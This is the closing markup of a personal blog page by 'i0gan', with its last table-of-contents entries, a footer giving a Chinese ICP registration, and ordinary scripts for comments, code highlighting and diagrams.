toc-level-2"><a class="toc-link" href="#Example-2"><span class="toc-text">Example 2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-text">总结</span></a></li></ol></li></ol></div></div></div><footer><nobr><span class="text-title">ICP</span><a class="text-content" target="_blank" rel="noopener" href="https://beian.miit.gov.cn/">沪ICP备2021037250号-1  </a></nobr><nobr><span class="text-title">©</span><span class="text-content">2022 by i0gan</span></nobr><br></footer></aside></main><canvas id="canvas-dust"></canvas><div id="cursor-container"><div id="cursor-outer"></div><div id="cursor-effect"></div></div><script src="/js/search.js"></script><script class="pjax-js">reset=_=>{new Valine({
 el: '#Valine'
 , appId: 'TzNey4n3v0Sx6vdBbytYLoH9-gzGzoHsz'
 , appKey: 'GIXXrK9zLxt0bZLww1hte0Oq' , placeholder: '此条评论委托企鹅物流发送'
});code.findCode();mermaid.init(undefined, ('.mermaid'));}</script><script src="//unpkg.com/@highlightjs/cdn-assets@11.4.0/highlight.min.js"></script><script src="/js/arknights.js"></script><script>window.addEventListener("load",()=>{reset()})</script></body></html>